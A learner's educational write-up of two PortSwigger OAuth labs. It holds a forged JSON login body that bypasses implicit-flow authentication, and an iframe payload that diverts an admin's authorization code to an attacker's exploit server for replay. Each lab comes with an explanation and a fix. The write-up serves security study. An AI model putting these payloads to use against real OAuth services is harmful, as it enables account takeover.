# OAuth

> **Disclaimer.** Educational learning writeup. Practised against the
> [PortSwigger Web Security Academy](https://portswigger.net/web-security) OAuth
> labs — deliberately vulnerable targets, in my own environment. What follows is
> my explanation of the *mechanism, the exploitation path, and the fix*. Nothing
> here is aimed at systems I don't own or have permission to test.

OAuth is my first vulnerability class that lives in a **protocol flow** rather
than in a single input. The bug isn't an injectable field — it's a step in the
dance between three parties where one of them trusts something it shouldn't. So
this writeup spends most of its time on *who talks to whom*, because once the
flow is clear the vulnerability is obvious.

> Covers two labs so far: an implicit-flow auth bypass and a code-flow account
> hijack via `redirect_uri`. `state` attacks slot in later.

---

## The cast

- **Resource owner** — me, the user.
- **Client application** — the site I'm logging in to (a blog). At setup it
  *registered* with the OAuth service and got a `client_id` (public), a
  `client_secret` (secret), and a whitelist of allowed `redirect_uri`s.
- **OAuth service** — the social-media provider that authenticates me and issues
  tokens. Has an authorization endpoint (where the browser is sent) and a
  `/userinfo` endpoint (returns who a token belongs to).

The parameter that decides *which* dance runs is `response_type`:
`code` = authorization code flow (server-to-server, secure), `token` = **implicit
flow** (token straight to the browser).

---

# Part 1 — Implicit flow

## The implicit flow, step by step

1. Click "log in with social" — browser asks the blog to start login.
2. Blog redirects the browser to the OAuth service with `response_type=token`.
3. I log in and consent **at the OAuth service** — the only place my password is
   ever entered; never at the blog.
4. OAuth service redirects back to the blog with the token in the URL fragment
   (`#access_token=...`). The token lands directly in my browser.
5. The blog's JavaScript takes the token and calls the OAuth service
   `GET /userinfo` — "whose token is this?" — and gets my email back.
6. The JS then tells the blog's **own backend** who I am:
   `POST /authenticate {email, username, token}`. The backend opens a session
   based on that. **← the vulnerable step.**

## Lab: Authentication bypass via OAuth implicit flow

**Goal.** Log in as `carlos@carlos-montoya.net`, using my own social login
`wiener:peter`.

**Steps.**

1. *Recon (intercept off).* Logged in cleanly with `wiener:peter`, accepted the
   consent page, then read the whole dance in **Proxy → HTTP history**: the
   `GET /auth?...response_type=token...` to the OAuth host, the redirect back
   with `#access_token=...`, and finally a `POST /authenticate` to the blog host.
2. *Read the trust point.* The `POST /authenticate` body was:
   ```json
   {"email":"wiener@hotdog.com","username":"wiener","token":"<my real token>"}
   ```
   Three fields. `token` is my genuine, provider-issued bearer — hard to forge and
   bound to me. `email` and `username` are just text my own browser reports.
3. *Pivot (intercept on).* Logged out, started a fresh login, caught
   `POST /authenticate` before it left, and changed only the identity fields:
   ```json
   {"email":"carlos@carlos-montoya.net","username":"carlos","token":"<my real token>"}
   ```
   Left the `token` untouched. Forwarded → landed straight in Carlos's account.

**Why it works.** The backend trusts the `email` in the body and never
re-verifies, against the OAuth service, that my token actually belongs to that
email. My real token sails through validation while the identity riding next to
it is a lie.

### Where I got tripped up

The thing that genuinely confused me was thinking `POST /authenticate` was the
step that "checks my details with the provider." It isn't. There are **two
separate conversations**, and telling them apart is the whole lab:

- `GET /userinfo` → the **OAuth host**. Trustworthy — the email really comes out
  of my token.
- `POST /authenticate` → the **blog host**. Naive — it believes whatever email
  the browser hands it.

The quick tell in Burp is the **Host** header: two different servers, two
different levels of trust. The attack goes at `/authenticate` (fool the blog),
never `/userinfo` (you can't fool the OAuth service — it's bound to your token).

### Why no session-cookie theft was needed

Stealing a session cookie attacks the *end* of the auth chain — the session
Carlos already has. You'd need him online and a way to exfiltrate his cookie
(e.g. XSS). Here I attacked the *start* of the chain — the step that **decides**
identity — so the server minted me a brand-new, valid session *as Carlos*, of
its own accord. No victim online, no second bug, and it's repeatable for any
account by swapping the email. The rule: don't steal the token at the end if you
can corrupt the decision at the beginning.

### Fix

- The backend must never trust an `email` supplied in the request body. It should
  take the token and call `/userinfo` **server-side itself** to establish
  identity — never let the client assert who it is.
- Better: use **authorization code flow** (`response_type=code`). The token is
  obtained by a server-to-server exchange (`code` + `client_secret`) that the
  browser can't touch, so there's no forgeable identity field in the first place.

---

# Part 2 — Code flow

Code flow is what implicit flow "fixes to." Instead of handing the token to the
browser, the OAuth service hands back a one-time **authorization code**, and the
secret exchange moves server-side. That closes the implicit-flow bug — but it
opens a different one, because the code still travels through the browser.

## The code flow, step by step

1. Click "log in with social".
2. Blog redirects to the OAuth service with `response_type=code` **and a
   `redirect_uri`** (where to deliver the code).
3. I log in and consent at the OAuth service.
4. OAuth service redirects back to the `redirect_uri` with `?code=...` — a
   **one-time code**, useless on its own. It lands in my browser.
5. The blog's **backend** exchanges it: `code` + `client_secret` → OAuth
   `/token` endpoint. Server-to-server; the browser never sees this.
6. OAuth returns the access token to the backend.
7. Backend calls `/userinfo`, gets my identity, opens a session.

The identity step is now airtight — you can't forge it, because the exchange
uses a secret you don't have. **But** step 4's code passes through the browser,
and *where* it gets delivered is decided by `redirect_uri`. If the OAuth service
doesn't validate that value, you can say "deliver this user's code to *me*."

## Lab: OAuth account hijacking via redirect_uri

**Goal.** Log in as the admin. The lab's simulated "victim" *is* the admin — a
user who is already logged in at the OAuth service and has already consented, so
the whole flow runs silently on a single page load.

**Steps.**

1. *Recon.* Logged in with `wiener:peter`, read the `GET /auth?...` request in
   HTTP history. Noted the three distinct hosts, which are easy to mix up:
   - **OAuth host** — `oauth-*.oauth-server.net` (issues the code)
   - **exploit-server host** — `exploit-*.exploit-server.net` (my server)
   - **blog host** — `*.web-security-academy.net` (the client app)
2. *Confirm `redirect_uri` isn't validated (with my own account).* Re-sent
   `GET /auth?...` with `redirect_uri` pointed at my exploit server. Checked the
   exploit server's **access log** — a `GET /?code=...` appeared. Confirmed: the
   OAuth service delivers the code anywhere. (The code there was *mine* — just
   proof the mechanism is broken.)
3. *Build the delivery page.* On the exploit server, body =
   ```html
   <iframe src="https://oauth-<LAB>.oauth-server.net/auth?client_id=<CLIENT_ID>&redirect_uri=https://exploit-<LAB>.exploit-server.net&response_type=code&scope=openid%20profile%20email"></iframe>
   ```
   An `<iframe>` (not `<img>`) because the browser has to *follow the OAuth
   redirects*, not just fetch one URL. Its `src` is the OAuth `/auth` endpoint
   with `redirect_uri` pointed back at me — the blog host does not appear here.
4. *Deliver and steal.* **Store** → **Deliver exploit to victim**. The admin's
   browser loads the iframe; since they're already logged in and have consented,
   the OAuth service issues *their* code silently and redirects it to my server.
   The admin's `GET /?code=...` shows up in the access log.
5. *Replay.* In a clean/incognito window (so my own session doesn't interfere),
   navigated to the blog's real callback with the stolen code:
   ```
   https://<blog>.web-security-academy.net/oauth-callback?code=<ADMIN_CODE>
   ```
   The blog did the secret exchange for me and opened a session **as the admin**.

**Why it works.** The OAuth service doesn't validate `redirect_uri` against the
client's registered whitelist, so it will deliver an authorization code to an
attacker-controlled address. I never touch the `client_secret` or the identity —
I just divert *where a secret gets delivered*, then let the legitimate client
redeem it for me.

### Where I got tripped up

Two things:

- **Building the hosts by hand.** My first iframe stuffed the blog URL into the
  middle of the OAuth host and ended up with `https://` twice. Lesson: don't
  construct these hosts — copy them verbatim from the recon request. Three
  different hosts, three different roles.
- **"When did I log in as admin?"** I expected a separate step. There isn't one:
  the lab's "victim" *is* the admin. The code I stole was the admin's from the
  start, so replaying it logged me in as admin directly. Impact is set by *who*
  the victim is — a normal user would be account takeover of one account; the
  admin is full compromise of the app.

### Fix

- The OAuth service must validate `redirect_uri` on **every** authorization
  request against an **exact-match** whitelist registered by the client — no
  substring or prefix matching (those fall to open-redirect tricks).
- Bind the code to the `redirect_uri` it was issued for, and require the same
  value at the `/token` exchange.

---

## Recurring theme

- **Implicit flow** = the server trusts a *client-supplied identity* (`email`).
  Same defect as 2FA broken logic (the `account` cookie) and the stay-logged-in
  cookie.
- **Code flow / `redirect_uri`** = the server delivers a *secret to an
  unvalidated address*. The identity is airtight, so the attack moves to the
  delivery step instead.

Both are the same disease — trust placed where it shouldn't be — in different
links of the same dance. The verb changes: from "don't trust what the client
says" to "don't deliver secrets to unverified addresses."

## Tools

Burp Suite — Proxy (HTTP history), intercept, Repeater; PortSwigger exploit
server (body editor, Deliver to victim, access log).
